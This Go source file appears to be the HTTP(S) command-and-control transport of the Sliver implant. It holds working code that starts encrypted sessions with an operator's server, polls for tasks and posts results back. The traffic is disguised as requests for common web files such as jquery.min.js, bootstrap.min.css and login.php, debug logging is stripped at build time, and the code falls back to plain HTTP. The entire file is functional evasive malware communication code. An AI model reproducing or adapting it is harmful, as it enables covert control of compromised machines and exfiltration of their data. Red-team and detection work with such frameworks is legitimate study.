package transports

// {{if .HTTPServer}}

// Procedural C2
// ===============
// .txt = rsakey
// .css = start
// .php = session
//  .js = poll
// .png = stop

import (
	"bytes"
	"crypto/rsa"
	"crypto/x509"
	"encoding/pem"
	"errors"
	"fmt"
	"io/ioutil"
	"strings"

	"sync"
	// {{if .Debug}}
	"log"
	// {{end}}

	"math/rand"
	"net"
	"net/http"
	"net/url"
	"path"
	"time"

	pb "sliver/protobuf/sliver"

	"github.com/golang/protobuf/proto"
)

const (
	defaultNetTimeout = time.Second * 60
	defaultReqTimeout = time.Second * 60 // Long polling, we want a large timeout
)

// HTTPStartSession - Attempts to start a session with a given address
func HTTPStartSession(address string) (*SliverHTTPClient, error) {
	var client *SliverHTTPClient
	client = httpsClient(address)
	err := client.SessionInit()
	if err != nil {
		// If we're using default ports then switch to 80
		if strings.HasSuffix(address, ":443") {
			address = fmt.Sprintf("%s:80", address[:len(address)-4])
		}
		client = httpClient(address) // Fallback to insecure HTTP
		err = client.SessionInit()
		if err != nil {
			return nil, err
		}
	}
	return client, nil
}

// SliverHTTPClient - Helper struct to keep everything together
type SliverHTTPClient struct {
	Origin     string
	Client     *http.Client
	SessionKey *AESKey
	SessionID  string
}

// SessionInit - Initailize the session
func (s *SliverHTTPClient) SessionInit() error {
	publicKey := s.getPublicKey()
	if publicKey == nil {
		// {{if .Debug}}
		log.Printf("Invalid public key")
		// {{end}}
		return errors.New("error")
	}
	skey := RandomAESKey()
	s.SessionKey = &skey
	httpSessionInit := &pb.HTTPSessionInit{Key: skey[:]}
	data, _ := proto.Marshal(httpSessionInit)
	encryptedSessionInit, err := RSAEncrypt(data, publicKey)
	if err != nil {
		// {{if .Debug}}
		log.Printf("RSA encrypt failed %v", err)
		// {{end}}
		return err
	}
	err = s.getSessionID(encryptedSessionInit)
	if err != nil {
		return err
	}
	return nil
}

func (s *SliverHTTPClient) getPublicKey() *rsa.PublicKey {
	uri := s.txtURL()
	// {{if .Debug}}
	log.Printf("[http] GET -> %s", uri)
	// {{end}}
	req, _ := http.NewRequest("GET", uri, nil)
	resp, err := s.Client.Do(req)
	if err != nil || resp.StatusCode != 200 {
		// {{if .Debug}}
		log.Printf("Failed to fetch server public key")
		// {{end}}
		return nil
	}
	data, _ := ioutil.ReadAll(resp.Body)
	pubKeyBlock, _ := pem.Decode(data)
	if pubKeyBlock == nil {
		// {{if .Debug}}
		log.Printf("Failed to parse certificate PEM")
		// {{end}}
		return nil
	}

	certErr := rootOnlyVerifyCertificate([][]byte{pubKeyBlock.Bytes}, [][]*x509.Certificate{})
	if certErr == nil {
		// {{if .Debug}}
		log.Printf("[http] Got a valid public key")
		// {{end}}
		cert, _ := x509.ParseCertificate(pubKeyBlock.Bytes)
		return cert.PublicKey.(*rsa.PublicKey)
	}

	// {{if .Debug}}
	log.Printf("[http] Invalid certificate %v", err)
	// {{end}}
	return nil
}

// We do our own POST here because the server doesn't have the
// session key yet.
func (s *SliverHTTPClient) getSessionID(sessionInit []byte) error {
	reader := bytes.NewReader(sessionInit) // Already RSA encrypted
	uri := s.cssURL()
	req, _ := http.NewRequest("POST", uri, reader)
	// {{if .Debug}}
	log.Printf("[http] POST -> %s", uri)
	// {{end}}
	resp, err := s.Client.Do(req)
	if err != nil {
		return err
	}
	if resp.StatusCode != 200 {
		return errors.New("send failed")
	}
	respData, _ := ioutil.ReadAll(resp.Body)
	defer resp.Body.Close()
	sessionID, err := GCMDecrypt(*s.SessionKey, respData)
	if err != nil {
		return err
	}
	s.SessionID = string(sessionID)
	// {{if .Debug}}
	log.Printf("[http] New session id: %v", s.SessionID)
	// {{end}}
	return nil
}

// Poll - Perform an HTTP GET request
func (s *SliverHTTPClient) Poll() ([]byte, error) {
	if s.SessionID == "" || s.SessionKey == nil {
		return nil, errors.New("no session")
	}
	uri := s.jsURL()
	req, _ := http.NewRequest("GET", uri, nil)
	// {{if .Debug}}
	log.Printf("[http] POST -> %s", uri)
	// {{end}}
	resp, err := s.Client.Do(req)
	if err != nil {
		// {{if .Debug}}
		log.Printf("[http] GET failed %v", err)
		// {{end}}
		return nil, err
	}
	if resp.StatusCode != 200 && resp.StatusCode != 201 {
		return nil, errors.New("Non-200 response code")
	}
	if resp.StatusCode == 403 {
		// {{if .Debug}}
		log.Printf("Server responded with invalid session for %v", s.SessionID)
		// {{end}}
		return nil, errors.New("invalid session")
	}
	respData, _ := ioutil.ReadAll(resp.Body)
	defer resp.Body.Close()
	return GCMDecrypt(*s.SessionKey, respData)
}

// Send - Perform an HTTP POST request
func (s *SliverHTTPClient) Send(data []byte) error {
	if s.SessionID == "" || s.SessionKey == nil {
		return errors.New("no session")
	}
	reqData, err := GCMEncrypt(*s.SessionKey, data)
	reader := bytes.NewReader(reqData)
	uri := s.phpURL()
	// {{if .Debug}}
	log.Printf("[http] POST -> %s", uri)
	// {{end}}
	req, _ := http.NewRequest("POST", uri, reader)
	resp, err := s.Client.Do(req)
	if err != nil {
		// {{if .Debug}}
		log.Printf("[http] POST failed %v", err)
		// {{end}}
		return err
	}
	if resp.StatusCode != 200 {
		return errors.New("send failed")
	}
	return nil
}

func (s *SliverHTTPClient) jsURL() string {
	curl, _ := url.Parse(s.Origin)
	segments := []string{"js", "static", "assets", "dist", "javascript"}
	filenames := []string{"underscore.min.js", "jquery.min.js", "bootstrap.min.js"}
	curl.Path = path.Join(s.randomPath(segments, filenames)...)
	return curl.String()
}

func (s *SliverHTTPClient) cssURL() string {
	curl, _ := url.Parse(s.Origin)
	segments := []string{"css", "static", "assets", "dist", "stylesheets", "style"}
	filenames := []string{"bootstrap.min.css"}
	curl.Path = path.Join(s.randomPath(segments, filenames)...)
	return curl.String()
}

func (s *SliverHTTPClient) phpURL() string {
	curl, _ := url.Parse(s.Origin)
	segments := []string{"api", "rest", "larvel", "wordpress"}
	filenames := []string{"login.php", "signin.php", "api.php", "samples.php"}
	curl.Path = path.Join(s.randomPath(segments, filenames)...)
	return curl.String()
}

func (s *SliverHTTPClient) txtURL() string {
	curl, _ := url.Parse(s.Origin)
	segments := []string{"static", "www", "assets", "textual", "docs", "sample"}
	filenames := []string{"robots.txt", "sample.txt", "info.txt", "example.txt"}
	curl.Path = path.Join(s.randomPath(segments, filenames)...)
	return curl.String()
}

func (s *SliverHTTPClient) randomPath(segments []string, filenames []string) []string {
	seed := rand.NewSource(time.Now().Unix())
	insecureRand := rand.New(seed)
	n := insecureRand.Intn(2) // How many segements?
	genSegments := []string{}
	for index := 0; index < n; index++ {
		seg := segments[insecureRand.Intn(len(segments))]
		genSegments = append(genSegments, seg)
	}
	filename := filenames[insecureRand.Intn(len(filenames))]
	genSegments = append(genSegments, filename)
	return genSegments
}

// [ HTTP(S) Clients ] ------------------------------------------------------------

func httpClient(address string) *SliverHTTPClient {
	jar := cookieJar()
	return &SliverHTTPClient{
		Origin: fmt.Sprintf("http://%s", address),
		Client: &http.Client{
			Jar:     jar,
			Timeout: defaultReqTimeout,
		},
	}
}

func httpsClient(address string) *SliverHTTPClient {
	netTransport := &http.Transport{
		Dial: (&net.Dialer{
			Timeout: defaultNetTimeout,
		}).Dial,
		TLSHandshakeTimeout: defaultNetTimeout,
	}
	jar := cookieJar()
	return &SliverHTTPClient{
		Origin: fmt.Sprintf("https://%s", address),
		Client: &http.Client{
			Jar:       jar,
			Timeout:   defaultReqTimeout,
			Transport: netTransport,
		},
	}
}

func cookieJar() *Jar {
	return &Jar{
		lk:      sync.Mutex{},
		cookies: map[string][]*http.Cookie{},
	}
}

// Jar - Cookie Jar implementation that ignores domains/origins
type Jar struct {
	lk      sync.Mutex
	cookies map[string][]*http.Cookie
}

// NewJar - Get a new instance of a cookie jar
func NewJar() *Jar {
	jar := new(Jar)
	jar.cookies = make(map[string][]*http.Cookie)
	return jar
}

// SetCookies handles the receipt of the cookies in a reply for the
// given URL.  It may or may not choose to save the cookies, depending
// on the jar's policy and implementation.
func (jar *Jar) SetCookies(u *url.URL, cookies []*http.Cookie) {
	jar.lk.Lock()
	jar.cookies["_"] = cookies
	jar.lk.Unlock()
}

// Cookies returns the cookies to send in a request for the given URL.
// It is up to the implementation to honor the standard cookie use
// restrictions such as in RFC 6265.
func (jar *Jar) Cookies(u *url.URL) []*http.Cookie {
	return jar.cookies["_"]
}

// {{end}} -HTTPServer
